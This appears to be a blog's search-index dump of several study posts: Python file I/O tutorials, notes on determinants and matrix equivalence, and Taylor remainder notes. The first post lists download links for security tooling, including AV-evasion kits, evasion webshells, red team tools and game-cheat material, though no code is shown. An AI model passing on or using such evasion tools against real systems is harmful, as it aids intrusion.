https://pan.baidu.com/s/1awjXfkR4xRitkenSyPpn_w 提取码: 9ieh\nubuntu x64 20.04.3预安装虚拟机\n链接: https://pan.baidu.com/s/1PIRuo1h4RBxegqYIkMFx2g 提取码: rcsd\n域环境3台虚拟机（用户名密码都在文件名中）\n链接: https://pan.baidu.com/s/1oq4bG4ecWaB97324V91GCw 提取码: 174l\n预安装防火墙Monowall\n链接: https://pan.baidu.com/s/1EBYTLw_U74z6uj18UIA-Yw 提取码: wkvh\n=====================\n特殊情况\n苹果m1芯片win10虚拟机\n链接：https://pan.baidu.com/s/1cRvML1jPv6JfGBYfhAwEkA\n提取码：3r0j\n=========================\n渗透+逆向工程虚拟机\nwin7完整滲透測試+逆向工程工具預安裝虛擬機\n链接：https://pan.baidu.com/s/1r6AhgRLtkciqyUtep7okcA\n提取码：5z9u\n=====================\nctf版win10预安装虚拟机\nwin10-ctf.ova\n链接: https://pan.baidu.com/s/1wGtsdYzBIr4GcnjHxmh4lQ 提取码: pzjj\n=====================\n安全靶场类\n链接：https://pan.baidu.com/s/1dmU9DcXAthjY0te4qv4tAg\n提取码：38mj\n代码审计源码类\n链接：https://pan.baidu.com/s/1VU5IZAMXSmSrerN69-502w\n提取码：p7vj\nmisc类\n链接：https://pan.baidu.com/s/10d_oMAABD1sulW83qbDMtA\n提取码：hk03\n数字取证类\n链接：https://pan.baidu.com/s/11yOS0eQajxSnSqQ8xHQFgA\n提取码：qfux\n========================\n逆向工程实验包\nhttps://pan.baidu.com/s/1lwAKPU6leg2A1bJX7LMyUg\n提取码: 8pj5\n=========================\nctf系列实验包\n链接：https://pan.baidu.com/s/1ZPfV05b7AoL4CF2Ex9wHwg\n提取码：qafo\n==========================\nAOME备份还原系统\n链接：https://pan.baidu.com/s/1xwEQC4d0ub5S3pg78fGPrA\n提取码：8cnu\n============================\n游戏外挂辅助学习\n链接: https://pan.baidu.com/s/1MLKND0RapwTPxW2ciOC1Wg\n提取码: h4bm\n免杀工具包\n链接: https://pan.baidu.com/s/17Rd6YAYhgHDv5u7pteWWJw\n提取码: 3f1d\nweb漏洞.rar\n链接: https://pan.baidu.com/s/1YA7RjBa4-ibrkxyhWJfz0A\n提取码: wcgt\n服务攻防\n链接无法分享\n红队工具\nhttps://pan.baidu.com/s/1AYGBjVYVKlDx9AEF_maiPQ\n提取码: em5w\n蓝队工具\nhttps://pan.baidu.com/s/1Zkc1vCsonzZBQ2Q2stZQNA\n提取码: hw32\n免杀webshell\nhttps://pan.baidu.com/s/1plbtPsJllE4fetMcAmtU4g\n提取码: 7inr\n信息收集补充\n链接: https://pan.baidu.com/s/1P8HoH3jMPwTIXf-ji6Scsg\n提取码: gfhg\n云安全工具\n链接: https://pan.baidu.com/s/1l-FMgaccQlrxhFJHakGvNA\n提取码: q9ev\nONE-FOX集成工具箱_V6\n链接: https://pan.baidu.com/s/1gu5Z7z2Ls6wW_8FOSOEH0A\n提取码: exxx\n移动终端工具(密码huayunsys.com).rar\n链接: https://pan.baidu.com/s/1gNQ-okYjgeg7aoz6Cono0Q\n提取码: x227\n===========================\nvulfocus靶场\n链接: https://pan.baidu.com/s/1YPJfsN6WFwA7Q9viE8ejLg\n提取码: wbsv\nsnort2虚拟机\n链接: https://pan.baidu.com/s/1oZpepxjTHY5qLqYb5UD4IQ\n提取码: 4fsi\n雷池虚拟机\n链接: https://pan.baidu.com/s/1tByIap_RTrLPFwKRfAaxBA\n提取码: ceuv\n蜜罐虚拟机\n链接: https://pan.baidu.com/s/1u3EauAmLuILovlcbe-cGnw\n提取码: akvm\nsuicata虚拟机\n链接: https://pan.baidu.com/s/1uImCWMW_LttEbFrEae5n-Q\n提取码: sg9t\njumpserver堡垒机\n链接: https://pan.baidu.com/s/1fUJFAkUPg99f6g72oELVBA\n提取码: gvi5\nMobexler\n链接: https://pan.baidu.com/s/1OFdDyEkyNiWP5ms2IEMrEg\n提取码: 2nm8\nELK日志分析\n链接: https://pan.baidu.com/s/176TUQmmRjwGmuQhuPFLCuw\n提取码: s73m\nHIDS-Wazuh\n链接: https://pan.baidu.com/s/1s7_Xh6XOJ9Ea648gJnOeNw\n提取码: e6rv\n==========================\nwin10-java8预安装虚拟机\n链接: https://pan.baidu.com/s/1QEAM5-apx8UKn1ZijQZ8IQ\n提取码: m9wd\n===========================\nwin10-vc2022-qt预安装虚拟机\n链接: https://pan.baidu.com/s/18BudoNm569KZk4ildcODJw\n提取码: 79qu win10-ctf虚拟机\n链接: https://pan.baidu.com/s/1ayzi1gzJGmiiNo1KBVo3kA\n提取码: ku4v\n============================\n","date":"2025-11-17T15:58:53+08:00","permalink":"https://www.retr0.xyz/p/0.%E5%AE%89%E5%85%A8%E7%B1%BB%E5%B7%A5%E5%85%B7%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E5%BA%93/","title":"0.安全类工具文件资源库"},{"content":"例： 需求：有一份账单文件，记录了消费收入的具体记录，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 name, date, money, type, remarks 周杰轮,2022-01-01,100000,消费,正式 周杰轮,2022-01-02,300000,收入,正式 周杰轮,2022-01-03,100000,消费,测试 林俊节,2022-01-01,300000,收入,正式 林俊节,2022-01-02,100000,消费,测试 林俊节,2022-01-03,100000,消费,正式 林俊节,2022-01-04,100000,消费,测试 林俊节,2022-01-05,500000,收入,正式 张学油,2022-01-01,100000,消费,正式 张学油,2022-01-02,500000,收入,正式 张学油,2022-01-03,900000,收入,测试 王力鸿,2022-01-01,500000,消费,正式 王力鸿,2022-01-02,300000,消费,测试 王力鸿,2022-01-03,950000,收入,正式 刘德滑,2022-01-01,300000,消费,测试 刘德滑,2022-01-02,100000,消费,正式 刘德滑,2022-01-03,300000,消费,正式 将内容复制保存为bill.txt\n任务：\n读取文件 将文件写出到bill.txt.bak文件作为备份 同时，将文件内标记为测试的数据行丢弃 实现思路：\nopen和r模式打开一个文件对象,并读取文件 open和w模式打开另一个文件对象,用于文件写出 for循环内容,判断是否是测试不是测试就write写出,是测试就continue跳过 将2个文件对象均close() 代码演示：\n1 2 3 4 5 6 7 8 9 10 f = open(\u0026#39;F:/bill.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) g = open(\u0026#39;F:/bill.txt.bak\u0026#39;,\u0026#39;a\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) for line in f: if line.count(\u0026#39;测试\u0026#39;) == 0: g.write(line) g.flush() else: continue f.close() g.close() ","date":"2025-11-16T22:37:55+08:00","permalink":"https://www.retr0.xyz/p/8.3-%E7%BB%83%E4%B9%A0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%9A%84%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B/","title":"8.3 练习：文件操作的综合案例"},{"content":"文件的从头写入 文件不存在 1 2 3 4 5 6 7 8 9 10 11 # 1.创建文件 f = (open(\u0026#39;python.txt\u0026#39;,\u0026#39;w\u0026#39;)) # 2.文件写入 f.write(\u0026#39;hello world\u0026#39;) # 3.内容刷新 f.flush() # 4.文件关闭 f.close() 注意：\n直接调用write，内容并未真正写入文件，而是会积攒在程序的内存中，称之为缓冲区 当调用flush的时候，内容会真正写入文件 这样做是避免频繁的操作硬盘，导致效率下降（攒一堆，一次性写磁盘） 文件已经存在 w模式会直接打开已有文件并清空所有内容\n其他与上述示例代码相同。\n文件的追加写入 1 2 3 4 5 6 7 8 9 10 11 # 1.打开文件，通过a模式打开即可 f = open(\u0026#39;python.txt\u0026#39;,\u0026#39;a\u0026#39;) # 文件写入 f.write(\u0026#39;hello world\u0026#39;) # 3. 内容刷新 f.flush() # 4.文件关闭 f.close() 注意：\na模式，文件不存在会创建文件 a模式，文件存在会在最后，追加写入文件 换行操作可以通过在写入内容中加入\u0026rsquo;\\n\u0026rsquo; 实现\n","date":"2025-11-15T21:50:41+08:00","permalink":"https://www.retr0.xyz/p/8.2-%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%99%E5%85%A5%E6%93%8D%E4%BD%9C/","title":"8.2 文件的写入操作"},{"content":"证明两个矩阵等价的核心方法（简要版） 矩阵等价的核心定义：设$A$、$B$为$m \\times n$同型矩阵，若存在$m$阶可逆矩阵$P$和$n$阶可逆矩阵$Q$，使得$PAQ = B$，则$A$与$B$等价。\n关键充要条件（满足其一即可证明） 秩相等：$r(A) = r(B)$（最常用，无需构造可逆矩阵，计算秩即可）； 初等变换互化：$A$可通过有限次初等行/列变换化为$B$； 等价标准形相同：$A$和$B$的等价标准形均为$\\begin{pmatrix} I_r \u0026amp; O \\ O \u0026amp; O \\end{pmatrix}$（$r$为秩，$I_r$为$r$阶单位矩阵）。 简要证明思路 先验证$A$与$B$是同型矩阵（行数、列数一致，否则必不等价）； 任选上述充要条件验证： 便捷法：计算$r(A)$和$r(B)$，若相等则等价； 严谨法：通过初等变换将$A$化为$B$，或构造$P$、$Q$使$PAQ = B$。 ","date":"2025-11-14T23:41:10+08:00","permalink":"https://www.retr0.xyz/p/%E8%AF%81%E6%98%8E%E7%9F%A9%E9%98%B5%E7%AD%89%E4%BB%B7/","title":"证明矩阵等价"},{"content":"一、行列式的核心计算方法及适用情况 1. 定义法 核心思路：直接利用n阶行列式的定义（所有$n!$项的代数和），即：\n$$|A| = \\sum_{p_1p_2\\cdots p_n} (-1)^{\\tau(p_1p_2\\cdots p_n)} a_{1p_1}a_{2p_2}\\cdots a_{np_n}$$\n其中$\\tau$是排列$p_1p_2\\cdots p_n$的逆序数。 适用情况： 1阶、2阶行列式（直接计算，无需简化）； 高阶行列式但零元素极多（非零项仅1-2项，可快速筛选）。 优点：直观、无需额外技巧；缺点：高阶（≥3阶）非零项多，计算量爆炸。 2. 按行（列）展开法（降阶法） 原理：行列式等于它的任意一行(列)各元素与其对应的代数余子式乘积之和，即 $$D=a_{i1}A_{i1}+a_{i2}A_{i3}+ \\cdots +a_{in}A_{in} (i=1,2, \\cdots ,n) $$ 核心思路：利用行列式展开定理，将n阶行列式按某行（列）展开为n个n-1阶行列式的线性组合：\n$$|A| = \\sum_{j=1}^n a_{ij}A_{ij} \\quad (\\text{按第}i\\text{行展开})$$\n其中$A_{ij}=(-1)^{i+j}M_{ij}$（$M_{ij}$为余子式）。 适用情况： 某行（列）零元素≥n-2个（直接展开后计算量小）； 可通过初等变换（如某行加另一行的$k$倍）快速造出一行（列）多零元素。 关键技巧：优先选择零元素最多的行（列）展开，减少计算量。 3. 初等变换法（化三角法） 核心思路：利用行列式的初等变换性质，将行列式化为上三角行列式（主对角线下方全为0）或下三角行列式（主对角线上方全为0），三角行列式的值=主对角线元素乘积：\n$$\\begin{vmatrix} a_{11} \u0026 a_{12} \u0026 \\cdots \u0026 a_{1n} \\\\ 0 \u0026 a_{22} \u0026 \\cdots \u0026 a_{2n} \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ 0 \u0026 0 \u0026 \\cdots \u0026 a_{nn} \\end{vmatrix} = a_{11}a_{22}\\cdots a_{nn}$$ 适用情况： 任意n阶行列式（3阶及以上最常用）； 元素无明显规律、零元素少的普通行列式。 常用变换：换行变号、某行乘非零常数、某行加另一行的$k$倍（不改变行列式值）。 4. 递推法 核心思路：通过展开或变换，建立n阶行列式$D_n$与低阶行列式（$D_{n-1}$、$D_{n-2}$）的递推关系（如$D_n = pD_{n-1} + qD_{n-2}$），求解递推公式得结果。 适用情况： 具有带状结构的行列式（如三对角行列式）； 结构对称、元素按规律重复的行列式（如$n$阶循环行列式）。 示例：三对角行列式（主对角线及相邻两条对角线非零，其余为0）：\n$$D_n = \\begin{vmatrix} a \u0026 b \u0026 \u0026 \\\\ c \u0026 a \u0026 b \u0026 \\\\ \u0026 c \u0026 a \u0026 \\ddots \\\\ \u0026 \u0026 \\ddots \u0026 \\ddots \u0026 b \\\\ \u0026 \u0026 \u0026 c \u0026 a \\end{vmatrix}$$\n展开后得递推关系$D_n = aD_{n-1} - bcD_{n-2}$，结合初始条件$D_1=a$、$D_2=a^2-bc$求解。 5. 数学归纳法 核心思路：先验证$n=1$（或$n=2$）时行列式等式成立，假设$n=k$时成立，证明$n=k+1$时也成立，从而推广到所有$n$。 适用情况： 已知行列式结果（需证明）； 结构具有明显递推规律的行列式（如范德蒙德行列式、高阶对称行列式）。 二、特殊结构行列式的专门解法及适用情况 1. 三角/对角行列式（含数量矩阵） 结构特征： 上三角：主对角线下方全为0；下三角：主对角线上方全为0； 对角行列式：仅主对角线非零（三角行列式的特例）。 适用情况：直接符合上述结构，或可通过1-2步初等变换化为该结构。 解法：直接取主对角线元素的乘积，即$|A| = \\prod_{i=1}^n a_{ii}$。 2. 范德蒙德行列式（Vandermonde Determinant） 结构特征：第$i$行（或列）为变量$x_1,x_2,\\cdots,x_n$的0到$n-1$次幂，形式如下：\n$$V_n = \\begin{vmatrix} 1 \u0026 1 \u0026 \\cdots \u0026 1 \\\\ x_1 \u0026 x_2 \u0026 \\cdots \u0026 x_n \\\\ x_1^2 \u0026 x_2^2 \u0026 \\cdots \u0026 x_n^2 \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ x_1^{n-1} \u0026 x_2^{n-1} \u0026 \\cdots \u0026 x_n^{n-1} \\end{vmatrix}$$ 适用情况：完全符合上述结构，或可通过转置、换行（列）调整为该结构（注意换行变号）。 解法：直接套用公式（所有变量两两差的乘积）：\n$$V_n = \\prod_{1 \\leq j \u003c i \\leq n} (x_i - x_j)$$ 关键提醒：若行列式是“列为幂次”，转置后仍为范德蒙德行列式（$|V_n^T|=|V_n|$）。 3. 爪型行列式（星形行列式） 结构特征：主对角线有非零元素，仅第一行、第一列（或最后一行、最后一列）有非零元素，其余为0，形如“爪”：\n$$D_n = \\begin{vmatrix} a_0 \u0026 b_1 \u0026 b_2 \u0026 \\cdots \u0026 b_n \\\\ c_1 \u0026 a_1 \u0026 0 \u0026 \\cdots \u0026 0 \\\\ c_2 \u0026 0 \u0026 a_2 \u0026 \\cdots \u0026 0 \\\\ \\vdots \u0026 \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ c_n \u0026 0 \u0026 0 \u0026 \\cdots \u0026 a_n \\end{vmatrix} \\quad (a_i \\neq 0)$$ 适用情况：严格符合“主对角线+第一行+第一列”的爪形结构（无其他非零元素）。 解法：消去第一列（或第一行）的非零元素，化为对角行列式：\n第$i$行（$i\\geq2$）减去$\\frac{c_i}{a_i} \\times$第1行，得：\n$$D_n = \\begin{vmatrix} a_0 - \\sum_{i=1}^n \\frac{b_i c_i}{a_i} \u0026 b_1 \u0026 b_2 \u0026 \\cdots \u0026 b_n \\\\ 0 \u0026 a_1 \u0026 0 \u0026 \\cdots \u0026 0 \\\\ 0 \u0026 0 \u0026 a_2 \u0026 \\cdots \u0026 0 \\\\ \\vdots \u0026 \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ 0 \u0026 0 \u0026 0 \u0026 \\cdots \u0026 a_n \\end{vmatrix} = \\left( a_0 - \\sum_{i=1}^n \\frac{b_i c_i}{a_i} \\right) \\prod_{i=1}^n a_i$$ 4. 箭型行列式（特殊爪型） 结构特征：仅第一行、最后一行、第一列、最后一列有非零元素，其余为0，形如“箭”：\n$$D_n = \\begin{vmatrix} a \u0026 b \u0026 \u0026 \u0026 c \\\\ d \u0026 a_2 \u0026 \u0026 \u0026 \\\\ \u0026 \u0026 a_3 \u0026 \u0026 \\\\ \u0026 \u0026 \u0026 \\ddots \u0026 \\\\ e \u0026 \u0026 \u0026 \u0026 a_n \\end{vmatrix} \\quad (a_i \\neq 0)$$ 适用情况：符合“四边非零、中间全零”的箭形结构。 解法：用第一列或最后一列的非零元素消去第一行、最后一行的非零元素，化为三角行列式。 5. 分块行列式 结构特征：矩阵可分块为对角块、上三角块或下三角块，例如： 分块对角：$A = \\begin{pmatrix} A_1 \u0026amp; O \\ O \u0026amp; A_2 \\end{pmatrix}$（$O$为零矩阵）； 分块上三角：$A = \\begin{pmatrix} A_1 \u0026amp; B \\ O \u0026amp; A_2 \\end{pmatrix}$。 适用情况：分块后非对角块为零矩阵（或可通过变换化为零块）。 解法：套用分块行列式公式： 分块对角：$|A| = |A_1| \\cdot |A_2| \\cdots |A_k|$； 分块上/下三角：$|A| = |A_1| \\cdot |A_2| \\cdots |A_k|$（仅需对角块非奇异）。 6. Hessenberg行列式 结构特征：上Hessenberg（主对角线下方仅一条非零元素带）或下Hessenberg（主对角线上方仅一条非零元素带）：\n$$D_n = \\begin{vmatrix} a_{11} \u0026 a_{12} \u0026 \\cdots \u0026 a_{1n} \\\\ a_{21} \u0026 a_{22} \u0026 \\cdots \u0026 a_{2n} \\\\ \u0026 a_{32} \u0026 \\cdots \u0026 a_{3n} \\\\ \u0026 \u0026 \\ddots \u0026 \\vdots \\\\ \u0026 \u0026 \u0026 a_{nn} \\end{vmatrix}$$ 适用情况：带状结构、非零元素集中在主对角线附近。 解法：按第一列（或最后一列）展开，建立递推关系求解。 三、方法选择优先级总结 先判断是否为特殊结构（范德蒙德、爪型、三角等）→ 直接套用专门公式； 若为普通行列式，先看是否有多零元素行（列） → 按行（列）展开降阶； 无明显零元素→ 用初等变换法化三角（3阶及以上首选）； 结构对称/带状→ 用递推法；需证明结果→ 用数学归纳法。 ","date":"2025-11-14T23:40:45+08:00","permalink":"https://www.retr0.xyz/p/%E7%AE%97%E8%A1%8C%E5%88%97%E5%BC%8F%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/","title":"算行列式的几种方法"},{"content":" 多项式+余项=公式\n一、泰勒多项式（Taylor Polynomial） 定义 设函数$ f(x) $在点$ x = a $处$ n $阶可导，则以$ x = a $为中心的$ n $次泰勒多项式为： $$ P_n(x) = f(a) + f'(a)(x - a) + \\frac{f''(a)}{2!}(x - a)^2 + \\cdots + \\frac{f^{(n)}(a)}{n!}(x - a)^n $$核心特点 本质：用$ f(x) $在$ x = a $处的函数值及各阶导数值，构造多项式逼近$ f(x) $； 局部性：在$ a $的邻域内逼近效果好，阶数$ n $越高，逼近越精确。 二、麦克劳林多项式（Maclaurin Polynomial） 定义 泰勒多项式的特殊情况——当中心$ a = 0 $时，$ n $次麦克劳林多项式为： $$ P_n(x) = f(0) + f'(0)x + \\frac{f''(0)}{2!}x^2 + \\cdots + \\frac{f^{(n)}(0)}{n!}x^n $$核心特点 简化形式：无需考虑$ (x - a) $项，直接以$ x $的幂次展开； 适用场景：$ f(x) $在$ x = 0 $处易求各阶导数（如$ e^x $、$ \\sin x $、$ \\cos x $等）。 三、拉格朗日余项（Lagrange Remainder） 定义 泰勒公式中，$ f(x) $与泰勒多项式$ P_n(x) $的误差（定量余项），表达式为： $$ R_n(x) = \\frac{f^{(n+1)}(\\xi)}{(n+1)!}(x - a)^{n+1} $$ 其中$ \\xi $是介于$ a $与$ x $之间的某个数。\n核心特点 定量误差：给出误差的具体表达式，可精确估计逼近精度； 条件：要求$ f(x) $在$ a $的邻域内$ n+1 $阶可导。 四、佩亚诺余项（Peano Remainder） 定义 泰勒公式中，误差的定性描述（高阶无穷小余项），表达式为： $$ R_n(x) = o\\left((x - a)^n\\right) \\quad (x \\to a) $$核心特点 定性误差：仅说明“当$ x \\to a $时，误差是$ (x - a)^n $的高阶无穷小”，不给出具体大小； 条件：仅需$ f(x) $在$ x = a $处$ n $阶可导，要求比拉格朗日余项低。 ","date":"2025-11-14T23:40:16+08:00","permalink":"https://www.retr0.xyz/p/%E5%87%A0%E7%A7%8D%E5%A4%9A%E9%A1%B9%E5%BC%8F%E5%8F%8A%E4%BD%99%E9%A1%B9/","title":"几种多项式及余项"},{"content":"文件编码 文件的读取操作 open()打开函数 使用open函数，可以打开一个已经存在的文件，或者创建一个新文件，语法如下\nopen(name,mode,encoding)\nname：是要打开的目标文件名的字符串（可以包含文件所在的具体路径）\nmode：设置打开文件的模式（访问模式）：只读r、写入w、追加a等。\nencoding：编码格式（推荐使用UTF-8）\n示例：\n1 2 f = open(\u0026#39;python.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#34;UTF-8\u0026#34;) # encoding的顺序不是第三位，所以不能用位置参数，用关键字参数直接指定 注意：此处‘f’是‘open’函数的文件对象，对象是Python中一种特殊的数据类型，拥有属性和方法可以使用对象.属性或对象.方法访问。\n模式 描述 r 以只读方式打开文件。文件的指针会放在文件的开头。这是默认模式。 w 打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，原有内容会被删除。 a 打开一个文件用于追加。如果该文件已存在，新的内容会被写道已有内容之后。如果该文件**不存在，创建新文件**进行写入。 read()方法 文件对象.read(num) num表示要从文件中读取的数据的长度（单位是字符），如果没有传入num，那么就表示读取文件中所有的数据。\n例如：\n1 2 3 4 # 有test.txt文件内容为：abcdefghijk f = open(\u0026#39;test.txt\u0026#39;) print(f.read(3))\t# 输出abc print(f.read(5))\t# 输出defgh readlines()方法 readlines可以按照行的方式把整个文件中的内容进行一次性读取，并且返回的是一个列表，其中返回的是一个**列表**，其中每一行的数据为一个元素。\n示例：\n1 2 3 4 5 6 7 8 # 有python.txt文件内容为： # abc # def # ghi f = open(\u0026#39;python.txt\u0026#39;) content = f.readlines() print(content)\t# 输出[\u0026#39;abc\\n\u0026#39;,\u0026#39;def\\n\u0026#39;,\u0026#39;ghi\\n\u0026#39;] 此处\\n为换行符 f.close()\t# 关闭文件 注意：连续调用多次read或readlines，后面的read会接着前面的继续读取而不是从头开始，相当于每次读取时文本中会有一个指针再向后读取，读到最后就没有东西可读了\nreadline()方法 readline可以一次读取一行内容\n1 2 3 4 5 6 7 8 9 10 # 有python.txt文件内容为： # abc # def # ghi f = open(\u0026#39;python.txt\u0026#39;) content = f.readline() print(f\u0026#39;第一行:{content}\u0026#39;)\t# 输出 abc content = f.readline() print(f\u0026#39;第二行:{content}\u0026#39;)\t# 输出 def f.close for循环读取文件行 示例：\n1 2 for line in open(\u0026#39;python.txt\u0026#39;,\u0026#39;r\u0026#39;): print(line) 文件的关闭 前面已经有提到，以对象名为\u0026rsquo;f\u0026rsquo;为例：\nf.close()\nwith open()语法 通过在with open的语句块中对文件进行操作，可以在操作完成后自动关闭close文件，避免遗忘掉close方法\n以对象名为\u0026rsquo;f\u0026rsquo;为例：\n1 2 with open(\u0026#39;python.txt\u0026#39;,\u0026#39;r\u0026#39;)as f: f.readline() ","date":"2025-11-14T23:36:48+08:00","permalink":"https://www.retr0.xyz/p/8.1-%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%BB%E5%8F%96%E6%93%8D%E4%BD%9C/","title":"8.1 文件的读取操作"},{"content":"多个返回值的写法 1 2 3 4 5 def test(): return 1,2 a,b= test() print(a) print(b) 按照返回值的顺序，写对应的多个变量接收即可\n变量之间用逗号隔开\n支持不同类型的数据return\n函数的多种参数使用形式 位置参数 调用时根据函数定义的参数位置来传递参数\n1 2 3 def user_info(name,age,gender): print(f\u0026#39;您的姓名是{name}，年龄是{age}，性别是{gender}\u0026#39;)\t# 注意此处print内有f，意为在字符串内插入表达式 user_info(\u0026#39;Retr0\u0026#39;,18,\u0026#39;男\u0026#39;) 关键字参数 调用时通过“键=值”形式传递参数\n1 2 3 4 5 6 7 8 def user_info(name,age,gender): print(f\u0026#39;您的姓名是{name}，年龄是{age}，性别是{gender}\u0026#39;) # 关键字传参 user_info(name=\u0026#39;小明\u0026#39;,age=20,gender=\u0026#39;男\u0026#39;) # 可以不按照固定顺序 user_info(age=20,gender=\u0026#39;男\u0026#39;,name=\u0026#39;小明\u0026#39;) # 可以和位置参数混用，位置参数必须在前，且匹配参数顺序 user_info(\u0026#39;小明\u0026#39;,age=20,gender=\u0026#39;男\u0026#39;) 注意：函数调用时，如果有位置参数时位置参数必须在关键字参数的前面，但关键字参数之间不存在先后顺序\n缺省参数 也叫默认参数，用于定义函数，为参数提供默认值，调用函数时刻不传该默认参数的值\n注意：所有位置参数必须出现在默认参数前，包括函数定义和调用\n1 2 3 4 def user_info(name,age,gender=\u0026#39;男\u0026#39;): print(f\u0026#39;您的姓名是{name}，年龄是{age}，性别是{gender}\u0026#39;) user_info(\u0026#39;Retr0\u0026#39;,20) user_info(\u0026#39;小红\u0026#39;,20,\u0026#39;女\u0026#39;) 函数调用时，如果为缺省参数传值则修改默认参数值，否则使用这个默认值\n不定长参数 也叫可变参数，用于不确定调用的时候会传递多少个参数（不传参也可以）的场景\n类型包括：\n位置传递 1 2 3 4 def test(*args):\t# *标记表示args这个形式参数接收的参数数量无限，且采用位置传递 print(args) test(\u0026#39;Retr0\u0026#39;) test(\u0026#39;Retr0\u0026#39;,\u0026#39;18\u0026#39;) 传进的所有参数都会被args变量收集，它会根据传进参数的位置合并为一个元组，args是元组类型\n关键字参数 1 2 3 def test(**kwargs):\t# **标记表示kwargs这个形式参数接收的参数数量无限，且采用关键字传递 print(kwargs) test(name=\u0026#39;Retr0\u0026#39;,age=18,gender=\u0026#39;男\u0026#39;) 参数是“键=值”的形式的情况下，所有的“键=值”都会被kwargs接受，同时根据“键=值”组成字典\n函数作为参数传递 示例：\n1 2 3 4 5 6 def test(compute): result = compute(1,2) print(result) def compute(x,y): return x + y test(compute) 此处函数compute作为参数传入了test函数中使用\n实质上数据由test函数内部传入的compute函数进行计算\n所以这是一种**计算逻辑的传递，而非数据的传递，而任何逻辑都可以自行定义并作为函数传入**\nlambda匿名函数 众所周知，\ndef 关键字，可以定义带有名称的函数\n而 lambda关键字，可以定义匿名函数（无名称）\n有名称的函数，可以基于名称重复使用\n无名称的匿名函数，只能临时使用一次\n匿名函数定义语法 lambda 传入参数: 函数体(一行代码)\nlambda 是关键字，表示定义匿名函数 传入参数表示匿名函数的形式参数，如：x，y表示接收2个形式参数 函数体，就是函数的执行逻辑，要注意：只能写一行，无法写多行代码 例如：\n1 2 3 4 def test(compute): result = compute(1,2) print(result) test(lambda x,y:x+y) ","date":"2025-11-11T22:51:43+08:00","permalink":"https://www.retr0.xyz/p/7.1-%E8%BF%9B%E9%98%B6%E5%87%BD%E6%95%B0/","title":"7.1 进阶函数"},{"content":"统计容器的元素个数 len 前几篇中都有提到，不做演示\n统计容器的最大元素 max 1 2 list = [1,2,3,4,5] print(max(list)) 统计容器的最小元素 min 1 2 list = [1,2,3,4,5] print(min(list)) 注意：字符串的比较大小原则按照ASCII表顺序比较,从第一个字符开始一位位比较只要有一个字符大整体就大\n类型转换 1 2 3 4 5 6 7 list = [\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;] A = tuple(list) B = str(list) C = set(list) print(A,type(A)) print(B,type(B)) print(C,type(C)) 需要注意：\n字符串转列表\n1 2 s = \u0026#39;abcde\u0026#39; print(list(s))\t# 输出[\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;] 字典转列表\n1 2 dict = {\u0026#39;key1\u0026#39;:1,\u0026#39;key2\u0026#39;:2,\u0026#39;key3\u0026#39;:3} print(list(dict))\t# 输出[\u0026#39;key1\u0026#39;, \u0026#39;key2\u0026#39;, \u0026#39;key3\u0026#39;] 舍弃了value 字典转字符串\n1 2 dict = {\u0026#39;key1\u0026#39;:1,\u0026#39;key2\u0026#39;:2,\u0026#39;key3\u0026#39;:3} print(str(dict))\t# 输出{\u0026#39;key1\u0026#39;: 1, \u0026#39;key2\u0026#39;: 2, \u0026#39;key3\u0026#39;: 3} 全部保留 排序 此处为《数据容器：列表》2.9 列表的排序 的复制版本\n见链接 数据容器：列表\n默认升序（数字从小到大，首字母从前到后），且会修改当前列表\n1 2 3 4 5 6 list1 = [10, 8, 3, 22, 33, 7, 11, 100, 54] list2 = [\u0026#39;f\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;e\u0026#39;] list1.sort() list2.sort() print(list1) print(list2) 可选参数：reverse\t降序\n1 2 3 list = [1,2,3,4,5] list.sort(reverse=True) print(list) 可选参数：key\t自定义排序\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] list.sort(key=len)\t#此处以长度为参考量，仅为其中一种用法 print(list) 你也可以将其组合\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] list.sort(key=len,reverse=True)\tprint(list) sorted()函数 用法与sort()一致，但是不会修改列表本身，而是将修改后的列表创建一个副本。简而言之，你需要一个变量来接收它。\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] a = sorted(list,key=len,reverse=True) print(a) 我们来比较一下二者的区别\n1 2 3 4 5 6 7 8 list1 = [5,4,3,2,1] list2 = [5,4,3,2,1] list3 = list1.sort() list4 = sorted(list2) print(list1)\t#[1, 2, 3, 4, 5]\t列表本身也被修改 print(list2)\t#[5, 4, 3, 2, 1]\t可见列表本身未被修改 print(list3)\t#None\t因为sort()函数不会传出修改后的列表 print(list4)\t#[1, 2, 3, 4, 5]\t","date":"2025-11-09T17:49:07+08:00","permalink":"https://www.retr0.xyz/p/6.7-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E7%9A%84%E9%80%9A%E7%94%A8%E6%93%8D%E4%BD%9C/","title":"6.7 数据容器的通用操作"},{"content":" 